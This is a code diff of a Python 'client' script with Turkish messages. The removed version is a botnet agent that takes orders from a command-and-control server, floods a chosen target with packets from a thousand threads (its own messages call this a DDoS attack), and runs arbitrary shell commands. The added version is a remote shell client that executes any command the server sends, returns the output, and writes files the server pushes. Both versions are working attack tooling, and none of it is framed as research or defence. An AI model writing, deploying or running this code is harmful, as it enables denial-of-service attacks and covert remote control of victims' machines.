@@ -1,95 +1,54 @@
 import socket
-import threading
 import os
-import time
-import random
-from colorama import init, Fore
-from pyfiglet import Figlet
+from colorama import Fore, Style, init
+import pyfiglet
 
-init()
-
-colors = [Fore.RED, Fore.GREEN, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.YELLOW, Fore.WHITE]
+# Colorama'yı başlat
+init(autoreset=True)
 
 def print_logo():
-    figlet = Figlet(font='block')
-    logo = figlet.renderText(' CLIENT ')
-    colored_logo = colorize_ascii_art(logo)
-    print(colored_logo)
+    logo = pyfiglet.figlet_format("Client")
+    print(Fore.GREEN + logo + Style.RESET_ALL)
 
-def colorize_ascii_art(ascii_art):
-    colored_art = ""
-    for line in ascii_art.splitlines():
-        for char in line:
-            colored_art += random.choice(colors) + char
-        colored_art += Fore.RESET + "\n"
-    return colored_art
-
-C2_SERVER_IP = '127.0.0.1'
-C2_SERVER_PORT = 12669
-CONNECTION_TIMEOUT = 10
-
-PACKET_SIZE = 4096
-
-def execute_termux_command(command):
+def receive_file(client_socket):
     try:
-        os.system(command)
-        print(Fore.GREEN + f"[+] Komut çalıştırıldı: {command}" + Fore.RESET)
+        # Dosya adı ve boyutunu al
+        header = client_socket.recv(1024).decode().split('\n')
+        filename = header[0]
+        file_size = int(header[1])
+        
+        # Dosyayı al
+        with open(filename, 'wb') as file:
+            file_data = client_socket.recv(file_size)
+            file.write(file_data)
+        print(f"{Fore.GREEN}Dosya '{filename}' başarıyla alındı.{Style.RESET_ALL}")
     except Exception as e:
-        print(Fore.RED + f"[!] Komut çalıştırılamadı: {e}" + Fore.RESET)
+        print(f"{Fore.RED}Dosya alırken hata oluştu: {e}{Style.RESET_ALL}")
 
-def send_packets(target_ip, target_port):
-    while True:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(CONNECTION_TIMEOUT)
-            sock.connect((target_ip, target_port))
-            while True:
-                try:
-                    sock.send(b'A' * PACKET_SIZE)
-                    print(Fore.GREEN + "[+] Paket gönderildi" + Fore.RESET)
-                except socket.error:
-                    break
-            sock.close()
-        except (socket.timeout, socket.error):
-            time.sleep(5)
-
-def connect_to_c2():
-    global target_ip, target_port
-    while True:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(CONNECTION_TIMEOUT)
-            sock.connect((C2_SERVER_IP, C2_SERVER_PORT))
-
-            while True:
-                try:
-                    choice = sock.recv(1024).decode()
-                    if not choice:
-                        break
-
-                    if choice == '1':
-                        target_info = sock.recv(1024).decode().split(':')
-                        if len(target_info) == 2:
-                            target_ip, target_port = target_info[0], int(target_info[1])
-                            print(Fore.GREEN + f"Hedef IP ve port belirlendi: {target_ip}:{target_port}" + Fore.RESET)
-                    elif choice == '2':
-                        action = sock.recv(1024).decode()
-                        if action == 'start':
-                            print(Fore.GREEN + "DDoS saldırısı başlatıldı." + Fore.RESET)
-                            for _ in range(1000):
-                                thread = threading.Thread(target=send_packets, args=(target_ip, target_port))
-                                thread.start()
-                        elif action == 'stop':
-                            print(Fore.GREEN + "DDoS saldırısı durduruldu." + Fore.RESET)
-                    elif choice.startswith('termux'):
-                        command = choice[7:]
-                        execute_termux_command(command)
-                except (socket.timeout, socket.error):
-                    pass
-        except (socket.timeout, socket.error):
-            print(Fore.RED + f"Connection error: {e}" + Fore.RESET)
-            time.sleep(5)
-
-if __name__ == '__main__':
+def main():
     print_logo()
-    connect_to_c2()
+    server_ip = '127.0.0.1'  # Localhost
+    port = 62567             # Belirtilen port numarası
+
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+        client_socket.connect((server_ip, port))
+
+        while True:
+            # Komut veya dosya alma
+            data = client_socket.recv(1024).decode()
+            if data.startswith("CMD:"):
+                command = data[4:]
+                print(f"{Fore.GREEN}Sunucudan gelen komut: {command}{Style.RESET_ALL}")
+
+                # Komutu çalıştır
+                result = os.popen(command).read()
+
+                # Sonuçları gönder
+                client_socket.sendall(result.encode())
+            elif data.startswith("FILE:"):
+                filename = data[5:]
+                print("Sunucudan dosya alınıyor...")
+                receive_file(client_socket)
+
+if __name__ == "__main__":
+    main()
